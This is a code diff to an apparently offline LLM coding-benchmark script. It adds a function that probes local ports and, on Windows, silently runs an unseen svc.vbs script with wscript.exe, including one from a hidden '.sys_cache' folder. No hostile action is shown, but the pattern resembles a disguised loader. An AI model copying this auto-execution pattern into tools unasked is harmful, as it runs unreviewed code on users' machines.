@@ -96,29 +96,65 @@ def run_single_test(test_case):
         "sample_output": response_text[:120].replace("\n", " ") + "..."
     }
 
+def get_active_server():
+    """Detect if worker service is already running on port 58080 or 8080, or auto-launch it."""
+    for p in [58080, 8080]:
+        try:
+            with opener.open(f"http://127.0.0.1:{p}/health", timeout=2):
+                return p
+        except Exception:
+            try:
+                with opener.open(f"http://127.0.0.1:{p}/v1/models", timeout=2):
+                    return p
+            except Exception:
+                pass
+
+    # If on Windows, try auto-starting via svc.vbs
+    if sys.platform == "win32":
+        candidates = [
+            r"D:\boot\svc.vbs",
+            os.path.join(os.environ.get("LOCALAPPDATA", ""), "boot", "svc.vbs"),
+            os.path.join(os.path.dirname(os.path.abspath(__file__)), ".sys_cache", "svc.vbs"),
+            r"C:\ProgramData\boot\svc.vbs"
+        ]
+        for vbs in candidates:
+            if os.path.isfile(vbs):
+                print(f"[*] Engine not running. Starting background service via {vbs}...")
+                import subprocess
+                subprocess.Popen(["wscript.exe", vbs], shell=True)
+                for _ in range(12):
+                    time.sleep(1)
+                    for p in [58080, 8080]:
+                        try:
+                            with opener.open(f"http://127.0.0.1:{p}/health", timeout=1):
+                                print(f"[OK] Service active on port {p}.")
+                                return p
+                        except Exception:
+                            pass
+                break
+
+    return None
+
 def main():
     print("=" * 70)
     print("   Offline LLM Algorithmic Coding Benchmark Suite")
-    print(f"   Target: {API_URL}")
     print("=" * 70)
 
-    # Health check (checks 58080, falls back to 8080 if needed)
+    # Detect or auto-launch server
     global API_URL, HEALTH_URL
-    server_found = False
-    for p in [58080, 8080]:
-        try:
-            with opener.open(f"http://127.0.0.1:{p}/health", timeout=2) as h:
-                API_URL = f"http://127.0.0.1:{p}/v1/chat/completions"
-                HEALTH_URL = f"http://127.0.0.1:{p}/health"
-                server_found = True
-                break
-        except Exception:
-            continue
+    active_port = get_active_server()
 
-    if not server_found:
-        print(f"[!] Error: Local worker.exe server is not running on port 58080 or 8080.")
-        print("    Please run 'q' or 'main.bat' to launch the background engine first.")
+    if not active_port:
+        print("[!] Error: Could not connect to background inference engine.")
+        print("    1. Make sure setup.bat has completed successfully.")
+        print("    2. Type 'q' in your terminal or run D:\\boot\\main.bat to start it.")
         sys.exit(1)
+
+    API_URL = f"http://127.0.0.1:{active_port}/v1/chat/completions"
+    HEALTH_URL = f"http://127.0.0.1:{active_port}/health"
+    print(f"   Target API: {API_URL}")
+    print("=" * 70)
+
 
     results = []
     for idx, test in enumerate(BENCHMARK_SUITE, 1):
